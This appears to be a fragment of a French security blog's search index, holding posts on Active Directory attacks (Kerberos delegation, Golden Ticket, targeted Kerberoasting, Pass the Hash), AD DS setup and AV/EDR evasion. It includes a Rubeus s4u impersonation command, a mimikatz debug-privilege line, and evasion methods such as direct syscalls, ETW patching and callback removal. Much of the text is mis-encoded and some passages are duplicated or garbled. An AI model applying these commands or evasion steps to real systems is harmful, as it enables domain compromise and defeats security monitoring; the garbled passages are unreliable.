service\nmimikatz # privilege: : debug Technique 2 Avec Powerview\nGet-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth Rubeus.exe s4u /user:appsvc /aes256:aaaaaaaaa /impersonateuser:administrator /msdsspn:servicename /domain:namedomain /ptt https://adsecurity.org/?p=1667\n","permalink":"https://nyobemichel.me/posts/activedirectory/delegation-kerberos/","summary":"\u003ch2 id=\"quest-ce-que-la-d√©l√©gation-kerberos-\"\u003eQu‚Äôest-ce que la d√©l√©gation Kerberos ?\u003c/h2\u003e\n\u003cp\u003eLa d√©l√©gation Kerberos est un param√®tre de d√©l√©gation qui permet aux applications de demander des informations d‚Äôidentification d‚Äôacc√®s √† l‚Äôutilisateur final pour acc√©der aux ressources pour le compte de l‚Äôutilisateur d‚Äôorigine.\u003c/p\u003e\n\u003cp\u003eLes trois principaux types de d√©l√©gation que je vais couvrir sont les suivants:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©l√©gation sans contrainte\u003c/strong\u003e : tout service peut √™tre utilis√© de mani√®re abusive si l‚Äôune de ses entr√©es de d√©l√©gation est sensible.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eD√©l√©gation contrainte\u003c/strong\u003e : les entit√©s contraintes peuvent √™tre abus√©es si l‚Äôune de leurs entr√©es de d√©l√©gation est sensible.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eD√©l√©gation contrainte bas√©e sur les ressources (RBCD)\u003c/strong\u003e : les entit√©s contraintes bas√©es sur les ressources peuvent √™tre abus√©es si l‚Äôentit√© elle-m√™me est sensible.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"d√©l√©gation-contrainte\"\u003eD√©l√©gation contrainte\u003c/h2\u003e\n\u003cp\u003eLa d√©l√©gation contrainte permet aux administrateurs de configurer les services auxquels un compte utilisateur ou ordinateur peut d√©l√©guer et quels protocoles d\u0026rsquo;authentification peuvent √™tre utilis√©s\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/dpapi-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/dumping-the-certificate-pfx/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/forest-trust-key-sid-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/gmsa-abuse/","summary":"","title":""},{"content":"L\u0026rsquo;attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT en utilisant le hachage du mot de passe du compte krbtgt. Lorsque ces tickets sont pr√©sent√©s √† un serveur AD, les informations qu\u0026rsquo;ils contiennent ne seront pas du tout v√©rifi√©es et seront consid√©r√©es comme valides car elles sont sign√©es avec le hachage du mot de passe du compte krbtgt. L\u0026rsquo; attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT (Ticket Granting Tickets) en utilisant le hachage du mot de passe du compte krbtgt . Lorsque ces tickets sont pr√©sent√©s √† un serveur AD, les informations qu\u0026rsquo;ils contiennent ne sont pas du tout v√©rifi√©es et sont consid√©r√©es comme valides en raison de la signature avec le hachage du mot de passe du compte krbtgt . Par exemple, il est possible de signer un ticket pour un utilisateur qui n\u0026rsquo;existe pas, comme DoesNotExist s\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;un , le billet dit aussi administrateur de domaine, et de demander un ticket TGS (Ticket Granting Service) qui lui permet d\u0026rsquo;acc√©der √† des machines distantes. Pour des raisons de discr√©tion, il est presque toujours pr√©f√©rable d\u0026rsquo;utiliser des utilisateurs qui existent dans le domaine. Cependant, mettre de fausses informations dans le ticket peut √™tre un excellent moyen de montrer l\u0026rsquo;impact et le manque de surveillance d\u0026rsquo;une organisation sur ces √©v√©nements.\n","permalink":"https://nyobemichel.me/posts/activedirectory/golden-ticket/","summary":"\u003cp\u003eL\u0026rsquo;attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT en utilisant le hachage du mot de passe du compte krbtgt. Lorsque ces tickets sont pr√©sent√©s √† un serveur AD, les informations qu\u0026rsquo;ils contiennent ne seront pas du tout v√©rifi√©es et seront consid√©r√©es comme valides car elles sont sign√©es avec le hachage du mot de passe du compte krbtgt.\nL\u0026rsquo; attaque Golden Ticket permet aux attaquants de falsifier et de signer des TGT (Ticket Granting Tickets) en utilisant le hachage du mot de passe du compte krbtgt . Lorsque ces tickets sont pr√©sent√©s √† un\nserveur AD, les informations qu\u0026rsquo;ils contiennent ne sont pas du tout v√©rifi√©es et sont consid√©r√©es comme valides\nen raison de la signature avec le hachage du mot de passe du compte krbtgt . Par exemple, il est possible de signer\nun ticket pour un utilisateur qui n\u0026rsquo;existe pas, comme DoesNotExist s\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;un\n, le billet dit aussi\nadministrateur de domaine, et de demander un ticket TGS (Ticket Granting Service) qui lui permet d\u0026rsquo;acc√©der √† des\nmachines distantes. Pour des raisons de discr√©tion, il est presque toujours pr√©f√©rable d\u0026rsquo;utiliser des utilisateurs qui\nexistent dans le domaine. Cependant, mettre de fausses informations dans le ticket peut √™tre un excellent moyen de\nmontrer l\u0026rsquo;impact et le manque de surveillance d\u0026rsquo;une organisation sur ces √©v√©nements.\u003c/p\u003e","title":""},{"content":"Active Directory Domain Services (AD DS) et ses services connexes constituent la base des r√©seaux d‚Äôentreprise qui ex√©cutent des syst√®mes d‚Äôexploitation Windows et non-Windows.\nles composants logiques¬†? Les composants logiques AD DS sont des structures que vous utilisez pour impl√©menter une conception AD DS appropri√©e pour une organisation.\nPartition : Une partition, ou contexte de nommage, est une partie de la base de donn√©es AD¬†DS. Bien que la base de donn√©es se compose d‚Äôun fichier nomm√© Ntds.dit, les diff√©rentes partitions contiennent des donn√©es diff√©rentes. sch√©ma : Un sch√©ma est l‚Äôensemble des d√©finitions des types d‚Äôobjets et des attributs que vous utilisez pour d√©finir les objets cr√©√©s dans AD DS. Domain : Un domaine est un conteneur d‚Äôadministration logique pour les objets tels que les utilisateurs et les ordinateurs. Un domaine est associ√© √† une partition sp√©cifique et vous pouvez organiser le domaine avec des relations parent-enfant avec d‚Äôautres domaines. Arborescence de domaine : Une arborescence de domaine est une collection hi√©rarchique de domaines qui partagent un domaine racine commun et un espace de noms DNS (Domain Name System) contigu Foret : Une for√™t est un regroupement d‚Äôun ou de plusieurs domaines qui ont une racine AD DS commune, un sch√©ma commun et un catalogue global commun OU : Une unit√© d‚Äôorganisation est un objet conteneur pour les utilisateurs, les groupes et les ordinateurs qui fournit un cadre pour d√©l√©guer les droits administratifs et l‚Äôadministration en liant des objets Strat√©gies de groupe (GPOs). Conteneur : Un conteneur est un objet qui fournit une infrastructure organisationnelle √† utiliser dans AD DS les composants physiques¬†? Contr√¥leur de domaine : Un contr√¥leur de domaine contient une copie de la base de donn√©es AD DS Magasin de donn√©es : Une copie du magasin de donn√©es existe sur chaque contr√¥leur de domaine. La base de donn√©es AD DS utilise la technologie de base de donn√©es Microsoft Jet et stocke les informations d‚Äôannuaire dans le fichier Ntds.dit et les fichiers journaux associ√©s. Serveur du catalogue global : Un serveur de catalogue global est un contr√¥leur de domaine qui h√©berge le catalogue global, qui est une copie partielle en lecture seule de tous les objets dans une for√™t multi-domaines. Contr√¥leur de domaine en lecture seule (RODC) : Un contr√¥leur de domaine en lecture seule est une installation sp√©ciale et en lecture seule de AD DS. Site : Un site est un conteneur pour les objets AD DS, tels que les ordinateurs et les services sp√©cifiques √† un emplacement physique Sous-r√©seau : Un sous-r√©seau est une portion des adresses IP du r√©seau d‚Äôune organisation attribu√©e aux ordinateurs dans un site. for√™ts et des domaines Active Directory Domain Services Une for√™t Active Directory Domain Services (AD DS) est une collection d‚Äôune ou plusieurs arborescences AD DS qui contiennent un ou plusieurs domaines AD DS\nUne racine commune. Un sch√©ma commun. Un catalogue global. Un domaine AD DS est un conteneur d‚Äôadministration logique pour les objets tels que¬†:\nUtilisateurs Groupes Ordinateurs Qu‚Äôest-ce qu‚Äôune for√™t AD DS¬†? Une for√™t est un conteneur de niveau sup√©rieur dans AD DS. Chaque for√™t est un regroupement d‚Äôune ou plusieurs arborescences de domaines qui partagent un sch√©ma de r√©pertoire commun et un catalogue global.\nQu‚Äôest-ce qu‚Äôun domaine AD DS¬†? Un domaine AD DS est un conteneur logique pour la gestion de l‚Äôutilisateur, de l‚Äôordinateur, du groupe et d‚Äôautres objets. La base de donn√©es AD DS stocke tous les objets de domaine, et chaque contr√¥leur de domaine stocke une copie de la base de donn√©es.\nQue sont les relations d‚Äôapprobation¬†? Les approbations AD DS permettent l‚Äôacc√®s aux ressources dans un environnement AD DS complexe. Lorsque vous d√©ployez un domaine unique, vous pouvez facilement accorder l‚Äôacc√®s aux ressources au sein du domaine aux utilisateurs et aux groupes √† partir du domaine. Lorsque vous impl√©mentez plusieurs domaines ou for√™ts, vous devez vous assurer que les approbations appropri√©es sont en place pour permettre le m√™me acc√®s aux ressources.\ncreation d\u0026rsquo;un nouveau Domaine Avant de commencer, veillez √† effectuer ces diff√©rentes actions sur votre serveur :\nD√©finir un nom d\u0026rsquo;h√¥te sur le serveur D√©finir une adresse IP statique (configuration r√©seau manuelle) Effectuer les derni√®res mises √† jour Windows D√©finissez un mot de passe complexe pour le compte Administrateur de votre serveur (ce sera votre futur compte Administrateur du domaine) Cette proc√©dure est r√©alis√©e sous Windows Server 2019, mais vous pouvez l\u0026rsquo;appliquer sur les versions plus r√©centes\nCr√©er un domaine Active Directory A. Installer le r√¥le ADDS La premi√®re √©tape √©tape, avant de cr√©er le domaine Active Directory, consiste √† installer le r√¥le \u0026ldquo;ADDS\u0026rdquo; :¬†Active Directory Domain Services. Il s\u0026rsquo;agit du r√¥le permettant de cr√©er un domaine Active Directory. Ouvrez le Gestionnaire de serveur, puis cliquez sur \u0026ldquo;G√©rer\u0026rdquo; puis \u0026ldquo;Ajouter des r√¥les et fonctionnalit√©s\u0026rdquo;.\n![[Pasted image 20250812104728.png]]\nL\u0026rsquo;√©tape cruciale de l\u0026rsquo;installation du r√¥le est ici, puisqu\u0026rsquo;il va falloir cocher \u0026ldquo;Services AD DS\u0026rdquo; dans la liste. Une second fen√™tre va appara√Ætre pour vous proposer d\u0026rsquo;installer les outils de gestion : validez. Qui dit outils de gestion, dit console d\u0026rsquo;administration comme \u0026ldquo;Utilisateurs et ordinateurs¬†Active Directory\u0026rdquo; mais aussi le module PowerShell pour Active Directory.\n![[Pasted image 20250812105052.png]] Lisez les messages indiqu√©s √† l\u0026rsquo;√©tape \u0026ldquo;AD DS\u0026rdquo;. Microsoft en propose pour √©voquer la synchronisation Active Directory avec Microsoft Entra ID (Azure Active Directory), son penchant dans le¬†Cloud¬†Microsoft.\n![[Pasted image 20250812105358.png]]\nCr√©er le domaine Active Directory Comme il s\u0026rsquo;agit d\u0026rsquo;un nouveau domaine dans une nouvelle for√™t, choisissez \u0026ldquo;Ajouter une nouvelle for√™t\u0026rdquo; et indiquez le nom de domaine. Si vous utilisez un nom de domaine tel que \u0026ldquo;\u0026rdquo;.\n![[Pasted image 20250812110935.png]]\n","permalink":"https://nyobemichel.me/posts/activedirectory/introduction-active-directory/","summary":"\u003cp\u003eActive Directory Domain Services (AD DS) et ses services connexes constituent la base des r√©seaux d‚Äôentreprise qui ex√©cutent des syst√®mes d‚Äôexploitation Windows et non-Windows.\u003c/p\u003e\n\u003ch2 id=\"les-composants-logiques\"\u003eles composants logiques¬†?\u003c/h2\u003e\n\u003cp\u003eLes composants logiques AD DS sont des structures que vous utilisez pour impl√©menter une conception AD DS appropri√©e pour une organisation.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePartition : Une partition, ou contexte de nommage, est une partie de la base de donn√©es AD¬†DS. Bien que la base de donn√©es se compose d‚Äôun fichier nomm√© Ntds.dit, les diff√©rentes partitions contiennent des donn√©es diff√©rentes.\u003c/li\u003e\n\u003cli\u003esch√©ma : Un sch√©ma est l‚Äôensemble des d√©finitions des types d‚Äôobjets et des attributs que vous utilisez pour d√©finir les objets cr√©√©s dans AD DS.\u003c/li\u003e\n\u003cli\u003eDomain : Un domaine est un conteneur d‚Äôadministration logique pour les objets tels que les utilisateurs et les ordinateurs. Un domaine est associ√© √† une partition sp√©cifique et vous pouvez organiser le domaine avec des relations parent-enfant avec d‚Äôautres domaines.\u003c/li\u003e\n\u003cli\u003eArborescence de domaine : Une arborescence de domaine est une collection hi√©rarchique de domaines qui partagent un domaine racine commun et un espace de noms DNS (Domain Name System) contigu\u003c/li\u003e\n\u003cli\u003eForet : Une for√™t est un regroupement d‚Äôun ou de plusieurs domaines qui ont une racine AD DS commune, un sch√©ma commun et un catalogue global commun\u003c/li\u003e\n\u003cli\u003eOU : Une unit√© d‚Äôorganisation est un objet conteneur pour les utilisateurs, les groupes et les ordinateurs qui fournit un cadre pour d√©l√©guer les droits administratifs et l‚Äôadministration en liant des objets Strat√©gies de groupe (GPOs).\u003c/li\u003e\n\u003cli\u003eConteneur : Un conteneur est un objet qui fournit une infrastructure organisationnelle √† utiliser dans AD DS\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"les-composants-physiques\"\u003eles composants physiques¬†?\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eContr√¥leur de domaine : Un contr√¥leur de domaine contient une copie de la base de donn√©es AD DS\u003c/li\u003e\n\u003cli\u003eMagasin de donn√©es : Une copie du magasin de donn√©es existe sur chaque contr√¥leur de domaine. La base de donn√©es AD DS utilise la technologie de base de donn√©es Microsoft Jet et stocke les informations d‚Äôannuaire dans le fichier Ntds.dit et les fichiers journaux associ√©s.\u003c/li\u003e\n\u003cli\u003eServeur du catalogue global : Un serveur de catalogue global est un contr√¥leur de domaine qui h√©berge le catalogue global, qui est une copie partielle en lecture seule de tous les objets dans une for√™t multi-domaines.\u003c/li\u003e\n\u003cli\u003eContr√¥leur de domaine en lecture seule (RODC) : Un contr√¥leur de domaine en lecture seule est une installation sp√©ciale et en lecture seule de AD DS.\u003c/li\u003e\n\u003cli\u003eSite : Un site est un conteneur pour les objets AD DS, tels que les ordinateurs et les services sp√©cifiques √† un emplacement physique\u003c/li\u003e\n\u003cli\u003eSous-r√©seau : Un sous-r√©seau est une portion des adresses IP du r√©seau d‚Äôune organisation attribu√©e aux ordinateurs dans un site.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 id=\"for√™ts-et-des-domaines-active-directory-domain-services\"\u003efor√™ts et des domaines Active Directory Domain Services\u003c/h1\u003e\n\u003cp\u003eUne for√™t Active Directory Domain Services (AD DS) est une collection d‚Äôune ou plusieurs arborescences AD DS qui contiennent un ou plusieurs domaines AD DS\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/kerberoast---cross-domain-attack/","summary":"","title":""},{"content":"Cet abus peut survenir lors du contr√¥le d\u0026rsquo;un objet dot√© d\u0026rsquo;un¬†GenericAll,¬†`GenericWrdddtechnique est appel√©e Kerberoasting cibl√©.Cet abus peut survenir lors du contr√¥le d\u0026rsquo;un objet dot√© d\u0026rsquo;un¬†GenericAll,¬†GenericWriteou¬†sur la cible. Un membre du groupe¬†Op√©rateur de compteWriteProperty¬†dispose g√©n√©ralement de¬†ces autorisations.Validated-SPN[]\nL\u0026rsquo;attaquant peut ajouter un SPN (¬†ServicePrincipalName) √† ce compte. Une fois ce SPN obtenu, le compte devient vuln√©rable au¬†Kerberoasting¬†. Cette technique est appel√©e Kerberoasting cibl√©.Cet abus peut survenir lors du contr√¥le d\u0026rsquo;un objet dot√© d\u0026rsquo;un¬†GenericAll,¬†GenericWriteou¬†sur la cible. Un membre du groupe¬†Op√©rateur de compteWriteProperty¬†dispose g√©n√©ralement de¬†ces autorisations.Validated-SPN\nL\u0026rsquo;attaquant peut ajouter un SPN (¬†ServicePrincipalName) √† ce compte. Une fois ce SPN obtenu, le compte devient vuln√©rable au¬†Kerberoasting¬†. Cette technique est appel√©e Kerberoasting cibl√©.\n","permalink":"https://nyobemichel.me/posts/activedirectory/kerberoasting-cibl%C3%A9/","summary":"\u003cp\u003eCet abus peut survenir lors du contr√¥le d\u0026rsquo;un objet dot√© d\u0026rsquo;un¬†\u003ccode\u003eGenericAll\u003c/code\u003e,¬†`GenericWrdddtechnique est appel√©e Kerberoasting cibl√©.Cet abus peut survenir lors du contr√¥le d\u0026rsquo;un objet dot√© d\u0026rsquo;un¬†GenericAll,¬†GenericWriteou¬†sur la cible. Un membre du groupe¬†Op√©rateur de compteWriteProperty¬†dispose g√©n√©ralement de¬†ces autorisations.Validated-SPN[]\u003c/p\u003e\n\u003cp\u003eL\u0026rsquo;attaquant peut ajouter un SPN (¬†\u003ccode\u003eServicePrincipalName\u003c/code\u003e) √† ce compte. Une fois ce SPN obtenu, le compte devient vuln√©rable au¬†\u003ca href=\"https://www.thehacker.recipes/ad/movement/kerberos/kerberoast\"\u003eKerberoasting\u003c/a\u003e¬†. Cette technique est appel√©e Kerberoasting cibl√©.Cet abus peut survenir lors du contr√¥le d\u0026rsquo;un objet dot√© d\u0026rsquo;un¬†\u003ccode\u003eGenericAll\u003c/code\u003e,¬†\u003ccode\u003eGenericWrite\u003c/code\u003eou¬†sur la cible. Un membre du groupe¬†\u003ca href=\"https://www.thehacker.recipes/ad/movement/builtins/security-groups\"\u003eOp√©rateur de compte\u003c/a\u003e\u003ccode\u003eWriteProperty\u003c/code\u003e¬†dispose g√©n√©ralement de¬†ces autorisations.\u003ccode\u003eValidated-SPN\u003c/code\u003e\u003ca href=\"https://www.thehacker.recipes/ad/movement/builtins/security-groups\"\u003e\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/laps-abuse/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/pam-trust---shadow-principal/","summary":"","title":""},{"content":"Qu\u0026rsquo;est-ce qu\u0026rsquo;une attaque Pass the Hash ? L\u0026rsquo;attaque ¬´¬†Pass the Hash¬†¬ª est r√©pandue dans les environnements Windows. Elle exploite le m√©canisme d\u0026rsquo;authentification du syst√®me d\u0026rsquo;exploitation Windows.\nPour √©viter de stocker les mots de passe en clair, Windows conserve les hachages NTLM des mots de passe des utilisateurs. Lors du processus d\u0026rsquo;authentification, Windows compare ces hachages plut√¥t que les mots de passe en clair. L\u0026rsquo;attaque ¬´¬†Pass the Hash¬†¬ª exploite ce m√©canisme.\nAu lieu de voler et d\u0026rsquo;utiliser des mots de passe en clair, les pirates se concentrent sur l\u0026rsquo;obtention et l\u0026rsquo;utilisation des hachages pour s\u0026rsquo;authentifier sur diverses ressources r√©seau. L\u0026rsquo;attaque ¬´¬†Pass the Hash¬†¬ª est furtive et tr√®s efficace.\nLors d\u0026rsquo;une attaque par ¬´¬†pass the Hash¬†¬ª, un attaquant commence par acc√©der au hachage d\u0026rsquo;un utilisateur, souvent en vidant le contenu de la base de donn√©es SAM du syst√®me ou de la m√©moire, √† l\u0026rsquo;aide d\u0026rsquo;outils comme Mimikatz.\n","permalink":"https://nyobemichel.me/posts/activedirectory/pass-the-hash/","summary":"\u003ch2 id=\"quest-ce-quune-attaque-pass-the-hash-\"\u003eQu\u0026rsquo;est-ce qu\u0026rsquo;une attaque Pass the Hash ?\u003c/h2\u003e\n\u003cp\u003eL\u0026rsquo;attaque ¬´¬†Pass the Hash¬†¬ª est r√©pandue dans les environnements Windows. Elle exploite le m√©canisme d\u0026rsquo;authentification du syst√®me d\u0026rsquo;exploitation Windows.\u003c/p\u003e\n\u003cp\u003ePour √©viter de stocker les mots de passe en clair, Windows conserve les hachages NTLM des mots de passe des utilisateurs. Lors du processus d\u0026rsquo;authentification, Windows compare ces hachages plut√¥t que les mots de passe en clair. L\u0026rsquo;attaque ¬´¬†Pass the Hash¬†¬ª exploite ce m√©canisme.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/passe-ticket/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/resource-based-constrained-delegation/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/sans-titre/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/ticket-silver/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/activedirectory/unconstrained-delegation/","summary":"","title":""},{"content":"Types de techniques de d√©tection D√©tection dynamique La d√©tection dynamique est une approche plus avanc√©e et plus complexe que la d√©tection statique. Elle se concentre davantage sur la v√©rification des fichiers √† l\u0026rsquo;ex√©cution, √† l\u0026rsquo;aide de diff√©rentes m√©thodes. La premi√®re m√©thode consiste √† surveiller les API Windows. Une autre m√©thode de d√©tection dynamique est le sandboxing.\nD√©tection heuristique et comportementale La d√©tection heuristique et comportementale est devenue essentielle dans les antivirus¬†modernes¬†. Les logiciels¬†antivirus¬†modernes s\u0026rsquo;appuient sur ce type de d√©tection pour d√©tecter les logiciels malveillants.\nC/C++ pour l\u0026rsquo;evasion √âviter la d√©tection statique (signatures) La d√©tection statique repose sur l\u0026rsquo;analyse du binaire avant son ex√©cution , sans n√©cessiter son ex√©cution. Cette analyse inclut la correspondance des signatures , des hachages , des heuristiques et m√™me des mod√®les d\u0026rsquo;apprentissage automatique qui inspectent les cha√Ænes, les appels d\u0026rsquo;API et la structure binaire.\n","permalink":"https://nyobemichel.me/posts/avedrevasion/introduction-antivirus/","summary":"\u003ch1 id=\"types-de-techniques-de-d√©tection\"\u003eTypes de techniques de d√©tection\u003c/h1\u003e\n\u003ch2 id=\"d√©tection-dynamique\"\u003eD√©tection dynamique\u003c/h2\u003e\n\u003cp\u003eLa d√©tection dynamique est une approche plus avanc√©e et plus complexe que la d√©tection statique. Elle se concentre davantage sur la v√©rification des fichiers √† l\u0026rsquo;ex√©cution, √† l\u0026rsquo;aide de diff√©rentes m√©thodes.\nLa premi√®re m√©thode consiste √† surveiller les API Windows.\nUne autre m√©thode de d√©tection dynamique est le sandboxing.\u003c/p\u003e\n\u003ch2 id=\"d√©tection-heuristique-et-comportementale\"\u003eD√©tection heuristique et comportementale\u003c/h2\u003e\n\u003cp\u003eLa d√©tection heuristique et comportementale est devenue essentielle dans les antivirus¬†modernes¬†. Les logiciels¬†antivirus¬†modernes s\u0026rsquo;appuient sur ce type de d√©tection pour d√©tecter les logiciels malveillants.\u003c/p\u003e","title":""},{"content":"L\u0026rsquo;obfuscation est largement utilis√©e dans de nombreux domaines li√©s aux logiciels pour prot√©ger¬†la¬†propri√©t√©¬†intellectuelle¬†(¬†PI¬†) et d\u0026rsquo;autres informations propri√©taires qu\u0026rsquo;une application peut contenir.\n","permalink":"https://nyobemichel.me/posts/avedrevasion/obfuscation-principe/","summary":"\u003cp\u003eL\u0026rsquo;obfuscation est largement utilis√©e dans de nombreux domaines li√©s aux logiciels pour prot√©ger¬†\u003cstrong\u003ela\u003c/strong\u003e¬†\u003cstrong\u003epropri√©t√©\u003c/strong\u003e¬†intellectuelle¬†(¬†\u003cstrong\u003ePI\u003c/strong\u003e¬†) et d\u0026rsquo;autres informations propri√©taires qu\u0026rsquo;une application peut contenir.\u003c/p\u003e","title":""},{"content":"Architecture AV/EDR D√©tection bas√©e sur la signature La d√©tection bas√©e sur les signatures s‚Äôappuie sur des mod√®les connus de code malveillant (cha√Ænes binaires, hachages ou s√©quences d‚Äôinstructions sp√©cifiques) pour identifier les menaces.\nTechniques d\u0026rsquo;√©vasion :\nR√©encodage ou cryptage du shellcode. Enveloppement de stub pour g√©n√©rer de nouveaux hachages. Utilisation de packers ou de crypteurs. D√©tection heuristique La d√©tection heuristique implique des v√©rifications statiques et dynamiques bas√©es sur des r√®gles sur le code, √† la recherche d\u0026rsquo;attributs ou de comportements suspects. Comment √ßa marche :\nUtilise des r√®gles pr√©d√©finies ou des v√©rifications de mod√®les de type YARA. Recherche des constructions suspectes¬†: Utilisation de l\u0026rsquo;API (par exemple,¬†VirtualAllocEx,¬†WriteProcessMemory). Noms de section ou autorisations anormaux (¬†.textmarqu√©s comme RWX). Entropie √©lev√©e sugg√©rant un cryptage ou un emballage. Exemples :\nFichier PE avec une petite¬†.textsection et une grande¬†.datasection. Utilisation de¬†IsDebuggerPresent()l\u0026rsquo;API. En-t√™tes de fichiers non standard ou m√©tadonn√©es PE modifi√©es. Techniques d\u0026rsquo;√©vasion :\nRembourrage des charges utiles pour r√©duire l\u0026rsquo;entropie. Obfuscation des appels d\u0026rsquo;API ou retard de chargement. Diviser la logique malveillante en plusieurs √©tapes. D√©tection comportementale La d√©tection comportementale surveille le comportement d‚Äôex√©cution des processus et le corr√®le avec des mod√®les malveillants connus.\nD√©tection bas√©e sur l\u0026rsquo;apprentissage automatique (ML) La d√©tection ML implique la formation de mod√®les sur de grands ensembles de donn√©es de comportements b√©nins et malveillants pour identifier des anomalies ou des mod√®les de type malware.\nComposant principal d\u0026rsquo;un EDR Capteur Le capteur est le composant logiciel l√©ger install√© sur le point de terminaison qui collecte la t√©l√©m√©trie et surveille le comportement en temps r√©el.\nKernel Driver Le pilote fonctionne dans¬†l\u0026rsquo;anneau 0¬†, offrant une int√©gration profonde avec le noyau du syst√®me d\u0026rsquo;exploitation pour surveiller les op√©rations de bas niveau.\nUserland Components Ces composants fonctionnent en mode utilisateur et s\u0026rsquo;interfacent directement avec les API et les applications du syst√®me d\u0026rsquo;exploitation.\nBackend (On-Premise or Hybrid) Le backend est l‚Äôinfrastructure qui re√ßoit et traite la t√©l√©m√©trie de tous les points de terminaison de l‚Äôenvironnement.\nCloud Component Les solutions EDR modernes utilisent une infrastructure cloud pour centraliser l\u0026rsquo;intelligence, l\u0026rsquo;analyse et les mises √† jour. Pour contourner la surveillance des appels API/syst√®me¬†:\nStrat√©gies d\u0026rsquo;√©vasion du Userland¬†: Mappage manuel¬†: chargez les DLL manuellement pour √©viter¬†LoadLibrary()la journalisation IAT. Appels syst√®me directs¬†: utilisez des outils tels que¬†SysWhispersou¬†Hell‚Äôs Gatepour appeler directement les appels syst√®me. Appels syst√®me indirects¬†: utilisez des gadgets ou des fonctions stub pour masquer la pile d\u0026rsquo;appels. √âvasion au niveau du noyau (avanc√©)¬†: Syscall Stomping¬†: √©crasez les instructions d\u0026rsquo;appel syst√®me pour rediriger vers des appels syst√®me alternatifs. Contournement ETW¬†: corrigez ou d√©sactivez les consommateurs ETW comme¬†EtwEventWrite. Suppression des rappels¬†: d√©senregistrez les rappels du noyau (n√©cessite un pilote en mode noyau). Hooking Le hooking consiste √† intercepter ou √† rediriger des appels de fonction ou des √©v√©nements syst√®me. Il existe deux principaux niveaux de hooking selon son impl√©mentation¬†:¬†le mode utilisateur (Userland)¬†et¬†le mode noyau (Kernelland)¬†.\nPr√©sentation de l\u0026rsquo;architecture d\u0026rsquo;ex√©cution de Windows Avant de plonger dans le hooking, il est essentiel de comprendre que Windows poss√®de une architecture en couches¬†:\nMode utilisateur¬†: o√π s\u0026rsquo;ex√©cutent les applications standard. Acc√®s limit√© aux ressources syst√®me. Mode noyau¬†: le c≈ìur du syst√®me d\u0026rsquo;exploitation (le noyau Windows) et les pilotes de p√©riph√©riques. Son acc√®s est illimit√©. ","permalink":"https://nyobemichel.me/posts/avedrevasion/techniques-pratiques-d%C3%A9vasion-av-edr/","summary":"\u003ch1 id=\"architecture-avedr\"\u003eArchitecture AV/EDR\u003c/h1\u003e\n\u003ch3 id=\"d√©tection-bas√©e-sur-la-signature\"\u003e\u003cstrong\u003eD√©tection bas√©e sur la signature\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eLa d√©tection bas√©e sur les signatures s‚Äôappuie sur des mod√®les connus de code malveillant (cha√Ænes binaires, hachages ou s√©quences d‚Äôinstructions sp√©cifiques) pour identifier les menaces.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTechniques d\u0026rsquo;√©vasion :\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eR√©encodage ou cryptage du shellcode.\u003c/li\u003e\n\u003cli\u003eEnveloppement de stub pour g√©n√©rer de nouveaux hachages.\u003c/li\u003e\n\u003cli\u003eUtilisation de packers ou de crypteurs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"d√©tection-heuristique\"\u003e\u003cstrong\u003eD√©tection heuristique\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eLa d√©tection heuristique implique des v√©rifications statiques et dynamiques bas√©es sur des r√®gles sur le code, √† la recherche d\u0026rsquo;attributs ou de comportements suspects.\n\u003cstrong\u003eComment √ßa marche :\u003c/strong\u003e\u003c/p\u003e","title":""},{"content":"Les services de f√©d√©ration Active Directory (AD FS) permettent la gestion des identit√©s et des acc√®s f√©d√©r√©s en partageant les identit√©s num√©riques et les droits au-del√† des limites de s√©curit√© et d‚Äôentreprise. AD FS √©tend la possibilit√© d‚Äôutiliser la fonctionnalit√© d‚Äôauthentification unique disponible dans une seule limite de s√©curit√© ou d‚Äôentreprise aux applications accessibles sur Internet pour permettre aux clients, partenaires et fournisseurs une exp√©rience utilisateur simplifi√©e tout en acc√©dant aux applications web d‚Äôune organisation.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-fs/overview/ad-fs-openid-connect-oauth-flows-scenarios\n","permalink":"https://nyobemichel.me/posts/azure/active-directory-federation-services-ad-fs/","summary":"\u003cp\u003eLes services de f√©d√©ration Active Directory (AD FS) permettent la gestion des identit√©s et des acc√®s f√©d√©r√©s en partageant les identit√©s num√©riques et les droits au-del√† des limites de s√©curit√© et d‚Äôentreprise. AD FS √©tend la possibilit√© d‚Äôutiliser la fonctionnalit√© d‚Äôauthentification unique disponible dans une seule limite de s√©curit√© ou d‚Äôentreprise aux applications accessibles sur Internet pour permettre aux clients, partenaires et fournisseurs une exp√©rience 